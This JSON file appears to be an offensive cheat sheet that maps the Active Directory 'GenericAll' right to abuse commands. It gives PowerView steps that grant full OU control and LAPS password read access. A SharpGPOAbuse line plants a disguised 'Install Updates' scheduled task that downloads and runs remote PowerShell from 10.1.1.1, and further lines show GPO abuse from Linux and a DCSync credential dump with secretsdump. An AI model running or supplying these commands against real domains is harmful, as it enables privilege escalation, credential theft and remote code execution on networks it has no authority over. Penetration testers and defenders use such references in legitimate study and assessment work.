{
    "GenericAll": {
        "meaning": "This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.",
        "common": "",
        "windows": {
            "PowerView_OU_Generic": [
                {
                    "order": 1,
                    "command": "$Guids = Get-DomainGUIDMap",
                    "description": "Get domain GUID map"
                },
                {
                    "order": 2,
                    "command": "$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name",
                    "description": "Get GUID for all objects"
                },
                {
                    "order": 3,
                    "command": "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid",
                    "description": "Create ACE granting full control of all descendant objects"
                },
                {
                    "order": 4,
                    "command": "$OU = Get-DomainOU -Raw (OU GUID)",
                    "description": "Get target OU object"
                },
                {
                    "order": 5,
                    "command": "$DsEntry = $OU.GetDirectoryEntry()",
                    "description": "Get directory entry for OU"
                },
                {
                    "order": 6,
                    "command": "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'",
                    "description": "Set security mask to DACL"
                },
                {
                    "order": 7,
                    "command": "$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)",
                    "description": "Add the ACE to object security"
                },
                {
                    "order": 8,
                    "command": "$dsEntry.PsBase.CommitChanges()",
                    "description": "Commit changes to apply ACE"
                }
            ],
            "PowerView_OU_Targeted": [
                {
                    "order": 1,
                    "command": "$Guids = Get-DomainGUIDMap",
                    "description": "Get domain GUID map"
                },
                {
                    "order": 2,
                    "command": "$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name",
                    "description": "Get GUID for LAPS password property"
                },
                {
                    "order": 3,
                    "command": "$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name",
                    "description": "Get GUID for Computer object type"
                },
                {
                    "order": 4,
                    "command": "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid",
                    "description": "Create targeted ACE for LAPS password access"
                },
                {
                    "order": 5,
                    "command": "$OU = Get-DomainOU -Raw Workstations",
                    "description": "Get target OU"
                },
                {
                    "order": 6,
                    "command": "$DsEntry = $OU.GetDirectoryEntry()",
                    "description": "Get directory entry"
                },
                {
                    "order": 7,
                    "command": "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'",
                    "description": "Set security mask"
                },
                {
                    "order": 8,
                    "command": "$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)",
                    "description": "Add ACE"
                },
                {
                    "order": 9,
                    "command": "$dsEntry.PsBase.CommitChanges()",
                    "description": "Commit changes"
                }
            ],
            "SharpGPOAbuse": [
                {
                    "order": 1,
                    "command": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Install Updates\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.1:80/a'))\\\"\" --GPOName \"Default Domain Policy\"",
                    "description": "Use SharpGPOAbuse to add malicious scheduled task via GPO"
                }
            ]
        },
        "linux": {
            "pyGPOAbuse": [
                {
                    "order": 1,
                    "command": "python3 pyGPOAbuse.py DOMAIN/user:password@domain-controller -gpo-id \"GPO-ID-HERE\"",
                    "description": "Use pyGPOAbuse to abuse GPO from Linux"
                }
            ],
            "Impacket": [
                {
                    "order": 1,
                    "command": "secretsdump.py DOMAIN/USER:PASSWORD@DC_IP",
                    "description": "Perform DCSync attack using secretsdump"
                }
            ]
        }
    }
}
